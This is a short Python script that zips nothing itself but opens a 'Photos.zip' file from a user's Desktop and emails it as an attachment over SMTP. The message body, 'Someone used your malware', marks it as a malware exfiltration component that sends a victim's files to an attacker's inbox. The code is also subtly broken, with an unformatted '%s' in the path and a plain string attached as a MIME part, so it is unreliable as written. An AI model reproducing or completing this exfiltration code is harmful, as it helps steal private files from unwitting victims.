import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

smtp_server = 'smtp.your-email-provider.com'
smtp_port = 587
smtp_user = 'your_email@example.com'
smtp_password = 'your_email_password'

from_email = 'your_email@example.com'
to_email = 'recipient@example.com'
subject = 'Subject: ZIP attachment'
body = 'Someone used your malware'

file_path = '%s\\Desktop\\Photos\.zip'

msg = MIMEMultipart()
msg['From'] = from_email
msg['To'] = to_email
msg['Subject'] = subject
msg.attach(body)

attachment = open(file_path, 'rb')
part = MIMEBase('application', 'octet-stream')
part.set_payload(attachment.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
msg.attach(part)
attachment.close()

try:
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()  
    server.login(smtp_user, smtp_password)
    server.sendmail(from_email, to_email, msg.as_string())
    server.quit()
    print("Email sent successfully.")
except Exception as e:
    print(f"Error: {e}")
